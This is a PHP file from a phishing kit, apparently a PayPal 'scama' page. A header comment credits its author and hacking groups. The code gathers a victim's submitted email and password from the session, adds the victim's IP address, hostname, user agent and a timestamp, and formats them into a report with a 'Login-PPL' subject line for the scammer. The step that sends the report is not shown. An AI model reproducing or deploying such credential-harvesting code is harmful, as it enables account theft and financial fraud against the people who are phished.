<?php


/*

+----------------------------------+
�--- PRIVATE  PP SCAMA   2015 -----�
�---------- Ver : 2.0 -------------�
�--------- HAmza El     -----------�
�----------- GREETZ TO ------------�
�--- Dz Phoniex : Dz Injector -----�
�----------------------------------�
�https://code.google.com/p/dznoob/ �
�----------------------------------�
�https://facebook.com/DzNOoBpage   �
+----------------------------------+


*/

date_default_timezone_set('GMT');
$ip = getenv("REMOTE_ADDR");
$datamasii=date("D M d, Y - g:i a");
$hostname = gethostbyaddr($ip);
$user = $_SERVER['HTTP_USER_AGENT'];

$login_email = $_SESSION['EM'];
$login_password = $_SESSION['PS'];

$msg = "
===================== *.Hamza El.* =====================
email: $login_email
pass: $login_password
---------------------------------------------
time : $datamasii
ip : $ip
UserAgent : $user
===================== *.Hamza El.* =====================
";
$subject = "*.* xD *_* | Login-PPL  | $ip";



?>